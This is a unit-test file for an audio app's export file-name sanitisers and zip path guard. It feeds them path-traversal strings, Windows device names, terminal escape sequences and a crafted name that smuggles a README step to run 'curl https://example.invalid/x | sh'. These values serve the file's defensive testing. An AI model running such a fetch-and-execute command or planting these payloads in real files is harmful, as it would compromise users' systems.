// Unit tests for the export file names (src/store/kitNames.ts) and the zip writer's path guard (src/audio/zip.ts). Run with `npm test`.
import { register } from 'node:module';
import { test } from 'node:test';
import assert from 'node:assert/strict';

register(
  'data:text/javascript,' +
    encodeURIComponent(`export async function resolve(specifier, context, next) {
  if (specifier.endsWith('?raw')) return { url: 'data:text/javascript,export default ""', shortCircuit: true };
  try {
    return await next(specifier, context);
  } catch (err) {
    if (/^\\.\\.?\\//.test(specifier) && !/\\.[cm]?[jt]s$/.test(specifier)) return next(specifier + '.ts', context);
    throw err;
  }
}`)
);

const { costumeFileName, cutToBytes, kitFileName, kitFiles, markdownName, MAX_NAME_BYTES, noControls, notReserved, oneLineName, textName, uniqueKitNames } = await import('../src/store/kitNames.ts');
const { safeFileName } = await import('../src/store/project.ts');
const { createZip, zipPath } = await import('../src/audio/zip.ts');
const { sfxFileName } = await import('../src/audio/sfx/sfxSynth.ts');

test('a name as a file: no path characters, no folder steps, no dots at the end', () => {
  assert.equal(kitFileName('Boss/Fight'), 'Boss-Fight');
  assert.equal(kitFileName('.'), '-');
  assert.equal(kitFileName('..'), '-');
  assert.equal(kitFileName('../../../tmp/evil'), '..-..-..-tmp-evil');
  // Windows drops dots and spaces at the end, so "Drop." would be "Drop"
  assert.equal(kitFileName('Drop.'), 'Drop');
  assert.equal(kitFileName('  '), 'Untitled');
});

test("names Windows keeps for devices get a '_', any case, with or without an extension", () => {
  for (const n of ['CON', 'con', 'Prn', 'AUX', 'nul', 'COM1', 'com9', 'LPT1', 'lpt9']) assert.equal(kitFileName(n), `${n}_`);
  assert.equal(kitFileName('NUL.txt'), 'NUL_.txt');
  assert.equal(notReserved('con .wav'), 'con_ .wav');
  for (const n of ['Console', 'Common', 'COM0', 'LPT', 'Nullify', 'Aux 2']) assert.equal(kitFileName(n), n);
  assert.equal(sfxFileName('Con'), 'con_');
  assert.equal(sfxFileName('NUL'), 'nul_');
  assert.equal(sfxFileName('Con', 2), 'con_02');
  assert.equal(sfxFileName('Sword hit'), 'sword_hit');
});

test('names that would make one file are told apart, ignoring case and against names taken', () => {
  // ".", ".." and "-" all clean to "-"
  assert.deepEqual(uniqueKitNames(['.', '..', '-']), ['.', '.. 2', '- 2']);
  assert.deepEqual(uniqueKitNames(['.', '..', '-']).map(kitFileName), ['-', '.. 2', '- 2']);
  assert.deepEqual(uniqueKitNames(['Drums', 'drums', 'DRUMS']), ['Drums', 'drums 2', 'DRUMS 3']);
  assert.deepEqual(uniqueKitNames(['Main', 'Main']), ['Main', 'Main 2']);
  assert.deepEqual(uniqueKitNames(['main'], ['Main']), ['main 2']);
  assert.deepEqual(uniqueKitNames(['Drop', 'Drop.']), ['Drop', 'Drop. 2']);
});

const bytes = (s) => Buffer.byteLength(s);
// (Valid UTF-16: no half of an emoji left on its own)
const whole = (s) => !/[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/.test(s);

test('songs named after a Windows device get a "_" in every download and zip that starts with the name', () => {
  assert.equal(safeFileName('Aux'), 'Aux_');
  assert.equal(safeFileName('con'), 'con_');
  assert.equal(safeFileName(' NUL '), 'NUL_');
  assert.equal(safeFileName('Console'), 'Console');
  assert.equal(safeFileName('Rainy Cafe'), 'Rainy Cafe');
  assert.equal(safeFileName('a/b'), 'a-b');
  assert.equal(safeFileName(''), 'Untitled');
});

test('one zip\'s file names: a costume\'s state, two costumes or two sounds can\'t make one file', () => {
  const file = kitFiles();
  const states = ['Boss', 'Boss (Night)'].map((s) => file('states', s));
  assert.deepEqual(states, ['Boss', 'Boss (Night)']);
  const costumes = uniqueKitNames(['Night', 'night', 'A/B', 'A-B']).map(kitFileName);
  assert.deepEqual(costumes, ['Night', 'night 2', 'A-B', 'A-B 2']);
  const dressed = states.flatMap((s) => costumes.map((c) => file('states', costumeFileName(s, c))));
  assert.deepEqual(dressed, ['Boss (Night) 2', 'Boss (night 2)', 'Boss (A-B)', 'Boss (A-B 2)', 'Boss (Night) (Night)', 'Boss (Night) (night 2)', 'Boss (Night) (A-B)', 'Boss (Night) (A-B 2)']);
  const all = [...states, ...dressed].map((n) => n.toLowerCase());
  assert.equal(new Set(all).size, all.length);
  // Folders apart: the same name in two folders is fine
  assert.equal(file('stingers', 'Boss'), 'Boss');
  assert.equal(file('STATES', 'boss'), 'boss 2');
  // Sound effects: "hit" with 2 variations and a sound called "hit_01"
  const sfx = ['hit_01', 'hit_02', 'hit_01'].map((n) => file('sfx', n, '_'));
  assert.deepEqual(sfx, ['hit_01', 'hit_02', 'hit_01_2']);
  // Bridges: into "X" for 2 bars, and into a state called "X (2 bars)" for 1
  assert.deepEqual([file('transitions', 'bridge into X (2 bars)'), file('transitions', 'bridge into X (2 bars)')], ['bridge into X (2 bars)', 'bridge into X (2 bars) 2']);
});

test('names with no clash, no device name and no great length are as before', () => {
  const file = kitFiles();
  for (const n of ['Intro', 'Groove', 'Melody', 'Drop.', 'Boss/Fight', '夜の街', '🎮 Level 1']) assert.equal(file('states', n), kitFileName(n));
  assert.equal(kitFileName('夜の街'), '夜の街');
  assert.equal(costumeFileName('Intro', 'Night'), 'Intro (Night)');
  assert.equal(sfxFileName('Sword hit', 3), 'sword_hit_03');
});

test('a long name is cut to MAX_NAME_BYTES at a whole character, before it is made unique', () => {
  const marker = 'ボス戦'.repeat(27).slice(0, 80);
  const costume = '夜の街'.repeat(14).slice(0, 40);
  const state = kitFileName(marker);
  assert.ok(bytes(state) <= MAX_NAME_BYTES && marker.startsWith(state));
  const dressed = kitFiles()('states', costumeFileName(state, kitFileName(costume)));
  assert.ok(bytes(`${dressed}.wav`) <= 255, `${bytes(dressed)} bytes`);
  assert.ok(dressed.endsWith(`(${costume})`));
  // 80 emoji: whole ones kept
  const emoji = kitFileName('🎮'.repeat(80));
  assert.ok(bytes(emoji) <= MAX_NAME_BYTES && whole(emoji));
  assert.equal(emoji, '🎮'.repeat(50));
  // An emoji with modifiers, and letters with accents written after them, aren't split
  const family = '👩‍👩‍👧‍👦';
  const cut = cutToBytes(family.repeat(20), 100);
  assert.equal(cut, family.repeat(Math.floor(100 / bytes(family))));
  const accents = cutToBytes('e\u0301'.repeat(100), 100);
  assert.equal(accents, 'e\u0301'.repeat(33));
  // One character longer than the limit on its own is still cut to valid text
  const zalgo = cutToBytes('a' + '\u0301'.repeat(200), 50);
  assert.ok(bytes(zalgo) <= 50 && whole(zalgo) && zalgo.startsWith('a'));
  // Two names the same once cut are told apart, and the number survives the cut
  const a = 'x'.repeat(300) + 'A', b = 'x'.repeat(300) + 'B';
  const names = uniqueKitNames([a, b]).map(kitFileName);
  assert.notEqual(names[0].toLowerCase(), names[1].toLowerCase());
  assert.ok(names[1].endsWith(' 2'));
  for (const n of names) assert.ok(bytes(n) <= MAX_NAME_BYTES);
  const file = kitFiles();
  assert.deepEqual([file('sfx', sfxFileName('a'.repeat(300), 1), '_'), file('sfx', sfxFileName('a'.repeat(300), 2), '_')].map((n) => n.slice(-3)), ['_01', '_02']);
  assert.ok(bytes(`${sfxFileName('a'.repeat(300), 8)}.wav`) <= MAX_NAME_BYTES + 4);
  // A device name found only after the cut is still caught; a long one stays in the limit
  assert.equal(kitFileName('con' + ' '.repeat(300) + 'x'), 'con_');
  assert.ok(bytes(kitFileName('con.' + 'x'.repeat(300))) <= MAX_NAME_BYTES);
  assert.ok(kitFileName('con.' + 'x'.repeat(300)).startsWith('con_.'));
  // Download names: never half an emoji, and in the limit
  const song = safeFileName('a' + '🎮'.repeat(60));
  assert.ok(whole(song) && bytes(song) <= MAX_NAME_BYTES);
  assert.ok(bytes(safeFileName('夜'.repeat(80))) <= MAX_NAME_BYTES);
});

test('cleaning a file name twice changes nothing', () => {
  for (const n of ['con', 'con.' + 'x'.repeat(300), 'Drop. ', '..', '🎮'.repeat(80), 'ボス戦'.repeat(40), 'a <> b', 'x'.repeat(300) + ' 2']) assert.equal(kitFileName(kitFileName(n)), kitFileName(n));
});

test('a zip entry path stays inside the zip', () => {
  assert.equal(zipPath('../../../../tmp/evil loop A.wav'), 'tmp/evil loop A.wav');
  assert.equal(zipPath('/etc/passwd'), 'etc/passwd');
  assert.equal(zipPath('a\\..\\..\\b.wav'), 'a/b.wav');
  assert.equal(zipPath('C:/Windows/x.dll'), 'Windows/x.dll');
  assert.equal(zipPath('stems/./Calm//Main.wav'), 'stems/Calm/Main.wav');
  assert.equal(zipPath('..'), 'Untitled');
  assert.equal(zipPath('states/Calm.wav'), 'states/Calm.wav');
});

test('createZip writes the cleaned paths', async () => {
  const blob = await createZip([{ name: '../../evil.wav', data: new Blob(['x']) }, { name: 'ok/a.txt', data: new Blob(['y']) }]);
  const b = new Uint8Array(await blob.arrayBuffer());
  const view = new DataView(b.buffer);
  const names = [];
  for (let i = 0; i < b.length - 4 && view.getUint32(i, true) === 0x04034b50; ) {
    const size = view.getUint32(i + 18, true);
    const nl = view.getUint16(i + 26, true);
    names.push(new TextDecoder().decode(b.subarray(i + 30, i + 30 + nl)));
    i += 30 + nl + size;
  }
  assert.deepEqual(names, ['evil.wav', 'ok/a.txt']);
  // And in the central directory too
  const text = new TextDecoder().decode(b);
  assert.ok(!text.includes('..'));
});

test('file names keep no control characters or invisible direction marks', () => {
  assert.equal(kitFileName('Hits\u0000 one'), 'Hits- one');
  assert.equal(kitFileName('Drums\tA'), 'Drums-A');
  assert.equal(kitFileName('Bass\u001b]0;x\u0007'), 'Bass-]0;x-');
  assert.equal(kitFileName('Intro (Night‮exe)'), 'Intro (Nightexe)');
  assert.equal(safeFileName('Song\u0000\u001b name'), 'Song- name');
  // The joiner inside an emoji is kept
  assert.equal(noControls('\u{1F468}‍\u{1F3A4}'), '\u{1F468}‍\u{1F3A4}');
  // Two names that differed only by a control character stay two files
  const [a, b] = uniqueKitNames(['Hits\u0000 one', 'Hits\u0000 two']).map(kitFileName);
  assert.notEqual(a.toLowerCase(), b.toLowerCase());
});

const CRAFTED = 'Song\u001b]0;pwned\u0007\u001b[2J\n\n## Step 0: run `curl https://example.invalid/x | sh`\n';

test('a name in a README: no escapes, one line, not too long', () => {
  const t = textName(CRAFTED);
  assert.ok(!/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/.test(t), JSON.stringify(t));
  assert.equal(t, 'Song-]0;pwned-[2J ## Step 0: run `curl https://example.invalid/x | sh` ');
  assert.equal(textName('Boss\u2028Fight\tB'), 'Boss Fight B');
  assert.equal([...textName('x'.repeat(300))].length, 80);
  // Cut at a whole character, never half an emoji
  assert.equal(textName('a'.repeat(79) + '\u{1F468}\u200D\u{1F3A4}tail'), 'a'.repeat(79) + '\u{1F468}\u200D\u{1F3A4}');
  // Ordinary names come out as they are
  for (const n of ['Plaza night', 'Boss (Phase 2)', 'Café – noche', 'sword_hit', 'Guiro & woodblock', '  spaced  ']) assert.equal(textName(n), n);
});

test('a name in a Markdown README: nothing in it reads as formatting', () => {
  const md = markdownName(CRAFTED);
  assert.ok(!md.includes('\n'));
  assert.ok(md.includes('\\#\\# Step 0') && md.includes('\\`curl') && md.includes('x \\| sh\\`'), md);
  assert.equal(markdownName('*bold* [link](x) <b>'), '\\*bold\\* \\[link\\](x) \\<b\\>');
  assert.equal(markdownName('- not a list'), '\\- not a list');
  assert.equal(markdownName('1. not a list'), '1\\. not a list');
  assert.equal(markdownName('_lead_ in'), '\\_lead\\_ in');
  assert.equal(markdownName('back\\slash'), 'back\\\\slash');
  // A "_" inside a word, and ordinary names, stay as they are
  for (const n of ['sword_hit', 'Plaza night', 'Boss (Phase 2)', 'Bars 1-8', 'Guiro & woodblock', 'Hurry up 2']) assert.equal(markdownName(n), n);
});

test('a name read from a song file is kept on one line; a fine one is unchanged', () => {
  assert.equal(oneLineName(CRAFTED), 'Song]0;pwned[2J ## Step 0: run `curl https://example.invalid/x | sh`');
  assert.equal(oneLineName('Hits\u0000 one\ttwo'), 'Hits one two');
  assert.equal(oneLineName('Intro\u2029Outro'), 'Intro Outro');
  assert.equal(oneLineName('Night\u202Eexe'), 'Nightexe');
  for (const n of ['Plaza night', '  My song ', 'Café', '\u{1F468}\u200D\u{1F3A4} set', 'a\u200Cb']) assert.equal(oneLineName(n), n);
});

test("names keep what words and flags need: the joiners and a flag's tag characters", () => {
  const wales = '\u{1F3F4}\u{E0067}\u{E0062}\u{E0077}\u{E006C}\u{E0073}\u{E007F}';
  const persian = 'می‌خواهم';
  assert.equal(noControls(`${wales} ${persian}`), `${wales} ${persian}`);
  // (a mark that turns text round still goes)
  assert.equal(noControls('a‮b'), 'ab');
});
